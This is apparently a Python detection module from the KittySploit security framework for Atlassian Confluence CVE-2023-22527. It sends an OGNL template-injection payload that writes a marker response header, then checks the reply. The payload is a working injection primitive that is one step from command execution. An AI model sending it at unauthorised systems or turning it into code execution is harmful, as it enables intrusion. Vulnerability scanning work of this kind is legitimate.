#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Atlassian Confluence CVE-2023-22527 (SSTI / OGNL) detection."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Atlassian Confluence CVE-2023-22527 Detection',
        'description': (
            'Detects CVE-2023-22527 template injection on /template/aui/text-inline.vm '
            'via a non-destructive OGNL header write (no command execution).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2023', 'confluence', 'atlassian',
            'ssti', 'rce', 'kev', 'vkev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {'capability': 'admin_surface', 'from_detail': ''},
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2023-22527',
            'https://confluence.atlassian.com/pages/viewpage.action?pageId=1333335615',
            'https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/',
        ],
        'cve': 'CVE-2023-22527',
    }

    def run(self):
        path = '/template/aui/text-inline.vm'
        # Safe OGNL: set response header instead of freemarker Execute().exec
        data = (
            "label=aaa\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027)"
            ".internalGet(\\u0027ognl\\u0027).findValue(#parameters.poc[0],{})%2b\\u0027"
            "&poc=@org.apache.struts2.ServletActionContext@getResponse()"
            ".setHeader(\\u0027x_vuln_check\\u0027,\\u0027ks-confluence-22527\\u0027)"
        )
        r = self.http_request(
            method='POST',
            path=path,
            allow_redirects=False,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            data=data,
        )
        if not r:
            return False

        header_val = ''
        try:
            header_val = r.headers.get('x_vuln_check') or r.headers.get('X_vuln_check') or ''
        except Exception:
            header_val = ''
        body = (r.text or '').lower()
        if not header_val:
            return False
        if 'empty{name=' not in body:
            return False

        self.set_info(
            severity='critical',
            reason='Confluence CVE-2023-22527 SSTI confirmed (OGNL header write)',
            path=path,
            evidence=f'x_vuln_check={header_val}',
        )
        return True
